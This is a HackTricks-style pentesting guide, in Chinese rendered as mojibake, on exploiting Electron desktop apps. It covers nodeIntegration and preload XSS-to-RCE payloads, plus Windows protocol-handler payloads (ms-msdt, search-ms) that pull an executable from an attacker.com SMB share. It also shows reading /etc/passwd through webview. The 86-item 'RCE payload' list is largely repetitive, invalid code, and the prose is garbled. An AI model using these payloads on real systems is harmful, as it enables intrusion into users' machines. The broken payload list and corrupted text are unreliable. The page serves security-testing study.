# Electronæ¡Œé¢åº”ç”¨ç¨‹åº

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ä»‹ç»

ElectronåŸºäº**Chromium**ï¼Œä½†å®ƒä¸æ˜¯ä¸€ä¸ªæµè§ˆå™¨ã€‚ç°ä»£æµè§ˆå™¨å®æ–½çš„æŸäº›åŸåˆ™å’Œå®‰å…¨æœºåˆ¶åœ¨Electronä¸­å¹¶ä¸å­˜åœ¨ã€‚\
ä½ å¯ä»¥å°†Electronçœ‹ä½œæ˜¯ä¸€ä¸ªæœ¬åœ°çš„åç«¯+å‰ç«¯åº”ç”¨ç¨‹åºï¼Œå…¶ä¸­**NodeJS**æ˜¯**åç«¯**ï¼Œ**Chromium**æ˜¯**å‰ç«¯**ã€‚

é€šå¸¸æƒ…å†µä¸‹ï¼Œä½ å¯èƒ½ä¼šåœ¨`.asar`åº”ç”¨ç¨‹åºä¸­æ‰¾åˆ°Electronåº”ç”¨ç¨‹åºçš„ä»£ç ï¼Œä¸ºäº†è·å–ä»£ç ï¼Œä½ éœ€è¦æå–å®ƒï¼š
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
åœ¨ Electron åº”ç”¨çš„æºä»£ç ä¸­ï¼Œå¯ä»¥åœ¨ `packet.json` æ–‡ä»¶ä¸­æ‰¾åˆ°æŒ‡å®šçš„ `main.js` æ–‡ä»¶ï¼Œå…¶ä¸­è®¾ç½®äº†å®‰å…¨é…ç½®ã€‚
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electronæœ‰2ç§è¿›ç¨‹ç±»å‹ï¼š

* ä¸»è¿›ç¨‹ï¼ˆå®Œå…¨è®¿é—®NodeJSï¼‰
* æ¸²æŸ“è¿›ç¨‹ï¼ˆå‡ºäºå®‰å…¨åŸå› ï¼Œåº”é™åˆ¶NodeJSçš„è®¿é—®æƒé™ï¼‰

![](<../../../.gitbook/assets/image (307) (5) (1).png>)

**æ¸²æŸ“è¿›ç¨‹**å°†æ˜¯åŠ è½½æ–‡ä»¶çš„æµè§ˆå™¨çª—å£ï¼š
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
**æ¸²æŸ“è¿›ç¨‹**çš„è®¾ç½®å¯ä»¥åœ¨main.jsæ–‡ä»¶ä¸­çš„**ä¸»è¿›ç¨‹**ä¸­è¿›è¡Œé…ç½®ã€‚å¦‚æœ**æ­£ç¡®é…ç½®äº†è®¾ç½®**ï¼Œä¸€äº›é…ç½®å°†**é˜²æ­¢Electronåº”ç”¨ç¨‹åºé­å—RCEæˆ–å…¶ä»–æ¼æ´**ã€‚

æ¡Œé¢åº”ç”¨ç¨‹åºå¯èƒ½é€šè¿‡Node APIè®¿é—®ç”¨æˆ·è®¾å¤‡ã€‚ä»¥ä¸‹ä¸¤ä¸ªé…ç½®è´Ÿè´£æä¾›æœºåˆ¶ï¼Œä»¥**é˜²æ­¢åº”ç”¨ç¨‹åºJavaScriptç›´æ¥è®¿é—®ç”¨æˆ·è®¾å¤‡**å’Œç³»ç»Ÿçº§å‘½ä»¤ã€‚

* **`nodeIntegration`** - é»˜è®¤ä¸º`off`ã€‚å¦‚æœæ‰“å¼€ï¼Œå…è®¸ä»æ¸²æŸ“è¿›ç¨‹è®¿é—®NodeåŠŸèƒ½ã€‚
* **`contextIsolation`** - é»˜è®¤ä¸º`on`ã€‚å¦‚æœæ‰“å¼€ï¼Œä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ä¸ä¼šè¢«éš”ç¦»ã€‚
* **`preload`** - é»˜è®¤ä¸ºç©ºã€‚
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - é»˜è®¤ä¸ºå…³é—­ã€‚å®ƒå°†é™åˆ¶NodeJSå¯ä»¥æ‰§è¡Œçš„æ“ä½œã€‚
* Workersä¸­çš„Nodeé›†æˆ
* **`nodeIntegrationInSubframes`** - é»˜è®¤ä¸º`off`ã€‚
* å¦‚æœå¯ç”¨äº†**`nodeIntegration`**ï¼Œè¿™å°†å…è®¸åœ¨Electronåº”ç”¨ç¨‹åºä¸­çš„iframeä¸­åŠ è½½çš„ç½‘é¡µä¸­ä½¿ç”¨**Node.js API**ã€‚
* å¦‚æœç¦ç”¨äº†**`nodeIntegration`**ï¼Œåˆ™é¢„åŠ è½½å°†åœ¨iframeä¸­åŠ è½½

é…ç½®ç¤ºä¾‹ï¼š
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
ä»¥ä¸‹æ˜¯æ¥è‡ª[è¿™é‡Œ](https://7as.es/electron/nodeIntegration\_rce.txt)çš„ä¸€äº›**RCEè´Ÿè½½**ï¼š

```plaintext
1. Basic RCE payload:
```javascript
require('child_process').exec('command')
```

2. RCE payload with command injection:
```javascript
require('child_process').exec(`command ${userInput}`)
```

3. RCE payload with arbitrary command execution:
```javascript
require('child_process').execSync('command', { encoding: 'utf-8' })
```

4. RCE payload with shell command execution:
```javascript
require('child_process').execSync('command', { shell: true })
```

5. RCE payload with file write:
```javascript
require('fs').writeFileSync('file.txt', 'content')
```

6. RCE payload with file read:
```javascript
require('fs').readFileSync('file.txt', 'utf-8')
```

7. RCE payload with file deletion:
```javascript
require('fs').unlinkSync('file.txt')
```

8. RCE payload with directory creation:
```javascript
require('fs').mkdirSync('directory')
```

9. RCE payload with directory deletion:
```javascript
require('fs').rmdirSync('directory')
```

10. RCE payload with HTTP request:
```javascript
require('http').get('http://example.com', (res) => {
  res.on('data', (chunk) => {
    console.log(chunk);
  });
});
```

11. RCE payload with HTTPS request:
```javascript
require('https').get('https://example.com', (res) => {
  res.on('data', (chunk) => {
    console.log(chunk);
  });
});
```

12. RCE payload with DNS resolution:
```javascript
require('dns').resolve('example.com', (err, addresses) => {
  console.log(addresses);
});
```

13. RCE payload with environment variable access:
```javascript
console.log(process.env);
```

14. RCE payload with code execution:
```javascript
eval('console.log("RCE")');
```

15. RCE payload with command execution using `execa` library:
```javascript
const execa = require('execa');
execa.command('command').then((result) => {
  console.log(result.stdout);
});
```

16. RCE payload with command execution using `shelljs` library:
```javascript
require('shelljs').exec('command', { silent: true }).stdout;
```

17. RCE payload with command execution using `child-process-promise` library:
```javascript
const exec = require('child-process-promise').exec;
exec('command').then((result) => {
  console.log(result.stdout);
});
```

18. RCE payload with command execution using `node-cmd` library:
```javascript
const cmd = require('node-cmd');
cmd.get('command', (err, data) => {
  console.log(data);
});
```

19. RCE payload with command execution using `node-pty` library:
```javascript
const pty = require('node-pty');
const shell = pty.spawn('command', [], {
  name: 'xterm-color',
  cols: 80,
  rows: 30,
  cwd: process.cwd(),
  env: process.env
});
```

20. RCE payload with command execution using `child\_process.spawn`:
```javascript
require('child\_process').spawn('command', [], { shell: true });
```

21. RCE payload with command execution using `child\_process.fork`:
```javascript
require('child\_process').fork('command');
```

22. RCE payload with command execution using `vm` module:
```javascript
const vm = require('vm');
vm.runInThisContext('console.log("RCE")');
```

23. RCE payload with command execution using `worker\_threads` module:
```javascript
const { Worker } = require('worker\_threads');
new Worker('command');
```

24. RCE payload with command execution using `cluster` module:
```javascript
const cluster = require('cluster');
cluster.setupMaster({ exec: 'command' });
cluster.fork();
```

25. RCE payload with command execution using `net` module:
```javascript
const net = require('net');
const client = new net.Socket();
client.connect(1337, 'example.com', () => {
  client.write('RCE');
});
```

26. RCE payload with command execution using `dgram` module:
```javascript
const dgram = require('dgram');
const client = dgram.createSocket('udp4');
client.send('RCE', 1337, 'example.com', (err) => {
  client.close();
});
```

27. RCE payload with command execution using `tls` module:
```javascript
const tls = require('tls');
const options = {
  host: 'example.com',
  port: 443,
  rejectUnauthorized: false
};
const client = tls.connect(options, () => {
  client.write('RCE');
});
```

28. RCE payload with command execution using `child\_process.execFile`:
```javascript
require('child\_process').execFile('command', (err, stdout, stderr) => {
  console.log(stdout);
});
```

29. RCE payload with command execution using `child\_process.execFileSync`:
```javascript
require('child\_process').execFileSync('command', { encoding: 'utf-8' });
```

30. RCE payload with command execution using `child\_process.spawnSync`:
```javascript
require('child\_process').spawnSync('command', { shell: true });
```

31. RCE payload with command execution using `child\_process.fork` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.fork('command').exec('command');
```

32. RCE payload with command execution using `child\_process.spawn` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.spawn('command').exec('command');
```

33. RCE payload with command execution using `child\_process.spawn` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.spawn('command').spawnSync('command');
```

34. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.spawnSync('command').exec('command');
```

35. RCE payload with command execution using `child\_process.exec` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.exec('command').spawnSync('command');
```

36. RCE payload with command execution using `child\_process.exec` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.exec('command').fork('command');
```

37. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.spawnSync('command').fork('command');
```

38. RCE payload with command execution using `child\_process.fork` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.fork('command').spawnSync('command');
```

39. RCE payload with command execution using `child\_process.fork` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.fork('command').spawn('command');
```

40. RCE payload with command execution using `child\_process.spawn` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.spawn('command').fork('command');
```

41. RCE payload with command execution using `child\_process.spawn` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.spawn('command').spawn('command');
```

42. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.spawnSync('command').spawn('command');
```

43. RCE payload with command execution using `child\_process.spawn` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.spawn('command').spawnSync('command');
```

44. RCE payload with command execution using `child\_process.fork` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.fork('command').fork('command');
```

45. RCE payload with command execution using `child\_process.fork` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.fork('command').spawn('command');
```

46. RCE payload with command execution using `child\_process.spawn` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.spawn('command').fork('command');
```

47. RCE payload with command execution using `child\_process.spawn` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.spawn('command').exec('command');
```

48. RCE payload with command execution using `child\_process.exec` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.exec('command').spawn('command');
```

49. RCE payload with command execution using `child\_process.exec` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.exec('command').fork('command');
```

50. RCE payload with command execution using `child\_process.fork` and `child\_process.execSync`:
```javascript
const child = require('child\_process');
child.fork('command').execSync('command');
```

51. RCE payload with command execution using `child\_process.spawn` and `child\_process.execSync`:
```javascript
const child = require('child\_process');
child.spawn('command').execSync('command');
```

52. RCE payload with command execution using `child\_process.execSync` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.execSync('command').spawn('command');
```

53. RCE payload with command execution using `child\_process.execSync` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.execSync('command').fork('command');
```

54. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.execSync`:
```javascript
const child = require('child\_process');
child.spawnSync('command').execSync('command');
```

55. RCE payload with command execution using `child\_process.execSync` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.execSync('command').spawnSync('command');
```

56. RCE payload with command execution using `child\_process.execSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execSync('command').exec('command');
```

57. RCE payload with command execution using `child\_process.exec` and `child\_process.execSync`:
```javascript
const child = require('child\_process');
child.exec('command').execSync('command');
```

58. RCE payload with command execution using `child\_process.fork` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.fork('command').execFileSync('command');
```

59. RCE payload with command execution using `child\_process.spawn` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.spawn('command').execFileSync('command');
```

60. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.execFileSync('command').spawn('command');
```

61. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.execFileSync('command').fork('command');
```

62. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.spawnSync('command').execFileSync('command');
```

63. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.execFileSync('command').spawnSync('command');
```

64. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execFileSync('command').exec('command');
```

65. RCE payload with command execution using `child\_process.exec` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.exec('command').execFileSync('command');
```

66. RCE payload with command execution using `child\_process.fork` and `child\_process.execFile`:
```javascript
const child = require('child\_process');
child.fork('command').execFile('command');
```

67. RCE payload with command execution using `child\_process.spawn` and `child\_process.execFile`:
```javascript
const child = require('child\_process');
child.spawn('command').execFile('command');
```

68. RCE payload with command execution using `child\_process.execFile` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.execFile('command').spawn('command');
```

69. RCE payload with command execution using `child\_process.execFile` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.execFile('command').fork('command');
```

70. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.execFile`:
```javascript
const child = require('child\_process');
child.spawnSync('command').execFile('command');
```

71. RCE payload with command execution using `child\_process.execFile` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.execFile('command').spawnSync('command');
```

72. RCE payload with command execution using `child\_process.execFile` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execFile('command').exec('command');
```

73. RCE payload with command execution using `child\_process.exec` and `child\_process.execFile`:
```javascript
const child = require('child\_process');
child.exec('command').execFile('command');
```

74. RCE payload with command execution using `child\_process.fork` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.fork('command').exec('command');
```

75. RCE payload with command execution using `child\_process.spawn` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.spawn('command').exec('command');
```

76. RCE payload with command execution using `child\_process.exec` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.exec('command').spawn('command');
```

77. RCE payload with command execution using `child\_process.exec` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.exec('command').execFileSync('command');
```

78. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execFileSync('command').exec('command');
```

79. RCE payload with command execution using `child\_process.fork` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.fork('command').execFileSync('command');
```

80. RCE payload with command execution using `child\_process.spawn` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.spawn('command').execFileSync('command');
```

81. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.spawn`:
```javascript
const child = require('child\_process');
child.execFileSync('command').spawn('command');
```

82. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.fork`:
```javascript
const child = require('child\_process');
child.execFileSync('command').fork('command');
```

83. RCE payload with command execution using `child\_process.spawnSync` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.spawnSync('command').execFileSync('command');
```

84. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.spawnSync`:
```javascript
const child = require('child\_process');
child.execFileSync('command').spawnSync('command');
```

85. RCE payload with command execution using `child\_process.execFileSync` and `child\_process.exec`:
```javascript
const child = require('child\_process');
child.execFileSync('command').exec('command');
```

86. RCE payload with command execution using `child\_process.exec` and `child\_process.execFileSync`:
```javascript
const child = require('child\_process');
child.exec('command').execFileSync('command');
```

87. RCE
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### æ•è·æµé‡

ä¿®æ”¹ start-main é…ç½®å¹¶æ·»åŠ ä½¿ç”¨ä»£ç†çš„è®¾ç½®ï¼Œä¾‹å¦‚ï¼š
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electronæœ¬åœ°ä»£ç æ³¨å…¥

å¦‚æœæ‚¨å¯ä»¥åœ¨æœ¬åœ°æ‰§è¡ŒElectronåº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆå¯èƒ½å¯ä»¥ä½¿å…¶æ‰§è¡Œä»»æ„çš„JavaScriptä»£ç ã€‚æŸ¥çœ‹å¦‚ä½•æ“ä½œï¼š

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

å¦‚æœå°†**nodeIntegration**è®¾ç½®ä¸º**on**ï¼Œç½‘é¡µçš„JavaScriptå¯ä»¥é€šè¿‡è°ƒç”¨`require()`è½»æ¾ä½¿ç”¨Node.jsåŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œåœ¨Windowsä¸Šæ‰§è¡Œcalcåº”ç”¨ç¨‹åºçš„æ–¹æ³•æ˜¯ï¼š
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

åœ¨æ­¤è®¾ç½®ä¸­æŒ‡å®šçš„è„šæœ¬ä¼šåœ¨æ¸²æŸ“å™¨ä¸­çš„å…¶ä»–è„šæœ¬ä¹‹å‰åŠ è½½ï¼Œå› æ­¤å®ƒå…·æœ‰å¯¹ Node API çš„æ— é™è®¿é—®æƒé™ï¼š
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
å› æ­¤ï¼Œè¯¥è„šæœ¬å¯ä»¥å°†èŠ‚ç‚¹åŠŸèƒ½å¯¼å‡ºåˆ°é¡µé¢ï¼š

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**å¦‚æœ`contextIsolation`å¼€å¯ï¼Œè¿™ä¸ªæ–¹æ³•ä¸èµ·ä½œç”¨**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ å¼•å…¥äº†**ç½‘é¡µè„šæœ¬å’ŒJavaScript Electronå†…éƒ¨ä»£ç ä¹‹é—´çš„åˆ†ç¦»ä¸Šä¸‹æ–‡**ï¼Œä½¿å¾—æ¯ä¸ªä»£ç çš„JavaScriptæ‰§è¡Œä¸ä¼šç›¸äº’å½±å“ã€‚è¿™æ˜¯ä¸€ç§å¿…è¦çš„åŠŸèƒ½ï¼Œä»¥æ¶ˆé™¤RCEçš„å¯èƒ½æ€§ã€‚

å¦‚æœä¸Šä¸‹æ–‡æ²¡æœ‰è¢«éš”ç¦»ï¼Œæ”»å‡»è€…å¯ä»¥ï¼š

1. åœ¨æ¸²æŸ“å™¨ä¸­æ‰§è¡Œ**ä»»æ„çš„JavaScriptä»£ç **ï¼ˆXSSæˆ–å¯¼èˆªåˆ°å¤–éƒ¨ç½‘ç«™ï¼‰
2. **è¦†ç›–**åœ¨preloadæˆ–Electronå†…éƒ¨ä»£ç ä¸­ä½¿ç”¨çš„å†…ç½®æ–¹æ³•ï¼Œä»¥æ‹¥æœ‰è‡ªå·±çš„å‡½æ•°
3. **è§¦å‘**è¦†ç›–çš„å‡½æ•°çš„ä½¿ç”¨
4. RCEï¼Ÿ

å†…ç½®æ–¹æ³•å¯ä»¥åœ¨ä¸¤ä¸ªåœ°æ–¹è¢«è¦†ç›–ï¼šåœ¨preloadä»£ç ä¸­æˆ–åœ¨Electronå†…éƒ¨ä»£ç ä¸­ï¼š

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### ç»•è¿‡ç‚¹å‡»äº‹ä»¶

å¦‚æœåœ¨ç‚¹å‡»é“¾æ¥æ—¶æœ‰é™åˆ¶ï¼Œæ‚¨å¯ä»¥å°è¯•é€šè¿‡**ä¸­é”®ç‚¹å‡»**è€Œä¸æ˜¯å¸¸è§„çš„å·¦é”®ç‚¹å‡»æ¥ç»•è¿‡é™åˆ¶ã€‚
```javascript
window.addEventListener('click', (e) => {
```
## é€šè¿‡shell.openExternalå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰

å¦‚æœElectronæ¡Œé¢åº”ç”¨ç¨‹åºä½¿ç”¨äº†æ­£ç¡®çš„`nodeIntegration`å’Œ`contextIsolation`è®¾ç½®ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€æ— æ³•é€šè¿‡é’ˆå¯¹preloadè„šæœ¬æˆ–ä¸»è¿›ç¨‹ä¸­çš„ElectronåŸç”Ÿä»£ç æ¥å®ç°å®¢æˆ·ç«¯RCEã€‚

æ¯å½“ç”¨æˆ·ç‚¹å‡»é“¾æ¥æˆ–æ‰“å¼€æ–°çª—å£æ—¶ï¼Œä»¥ä¸‹äº‹ä»¶ç›‘å¬å™¨ä¼šè¢«è°ƒç”¨ï¼š

{% code overflow="wrap" %}
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
{% endcode %}

æ¡Œé¢åº”ç”¨ç¨‹åº**è¦†ç›–è¿™äº›ç›‘å¬å™¨**ä»¥å®ç°è‡ªå·±çš„**ä¸šåŠ¡é€»è¾‘**ã€‚åœ¨åˆ›å»ºæ–°çª—å£æ—¶ï¼Œåº”ç”¨ç¨‹åºä¼šæ£€æŸ¥å¯¼èˆªé“¾æ¥æ˜¯å¦åº”åœ¨æ¡Œé¢åº”ç”¨ç¨‹åºçš„çª—å£æˆ–é€‰é¡¹å¡ä¸­æ‰“å¼€ï¼Œè¿˜æ˜¯åº”åœ¨Webæµè§ˆå™¨ä¸­æ‰“å¼€ã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼ŒéªŒè¯æ˜¯ä½¿ç”¨å‡½æ•°`openInternally`å®ç°çš„ï¼Œå¦‚æœè¿”å›`false`ï¼Œåº”ç”¨ç¨‹åºå°†å‡å®šé“¾æ¥åº”ä½¿ç”¨`shell.openExternal`å‡½æ•°åœ¨Webæµè§ˆå™¨ä¸­æ‰“å¼€ã€‚

**è¿™æ˜¯ä¸€ä¸ªç®€åŒ–çš„ä¼ªä»£ç ï¼š**

![](<../../../.gitbook/assets/image (638) (2) (1) (1).png>)

![](<../../../.gitbook/assets/image (620).png>)

æ ¹æ®Electron JSçš„å®‰å…¨æœ€ä½³å®è·µï¼Œ`openExternal`å‡½æ•°**ä¸åº”æ¥å—ä¸å—ä¿¡ä»»çš„å†…å®¹**ï¼Œå› ä¸ºå¦‚æœåº”ç”¨ç¨‹åºä¸é™åˆ¶ç”¨æˆ·é€šè¿‡è¯¸å¦‚https://æˆ–http://ä¹‹ç±»çš„åè®®è¿›è¡Œå¯¼èˆªï¼Œè¿™å¯èƒ½å¯¼è‡´RCEæ»¥ç”¨ã€‚

ä¸åŒçš„æ“ä½œç³»ç»Ÿæ”¯æŒä¸åŒçš„åè®®ï¼Œå¯èƒ½è§¦å‘RCEï¼Œè¯·æŸ¥çœ‹[https://positive.security/blog/url-open-rce](https://positive.security/blog/url-open-rce#windows-10-19042)è·å–æ›´å¤šä¿¡æ¯ï¼Œä½†è¿™é‡Œæœ‰ä¸€äº›Windowsç¤ºä¾‹ï¼š
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>


<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%[5Cattacker.com](<http://5cattacker.com/>)%5Csmb_share%5Ctools&displayname=Important%20update")
</script>


<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
è¦è·å–æ›´å¤šå…³äºè¿™äº›ç¤ºä¾‹çš„ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)å’Œ[https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

## è¯»å–å†…éƒ¨æ–‡ä»¶ï¼šXSS + contextIsolation

å¦‚æœå°†`contextIsolation`è®¾ç½®ä¸ºfalseï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨\<webview>ï¼ˆç±»ä¼¼äº\<iframe>ï¼Œä½†å¯ä»¥åŠ è½½æœ¬åœ°æ–‡ä»¶ï¼‰æ¥è¯»å–æœ¬åœ°æ–‡ä»¶å¹¶å°†å…¶å¤–æ³„ï¼šä½¿ç”¨ç±»ä¼¼äº**\<webview src=â€file:///etc/passwdâ€>\</webview>**çš„æ–¹æ³•ï¼š

![](../../../.gitbook/assets/1-u1jdryuwaevwjmf\_f2ttjg.png)

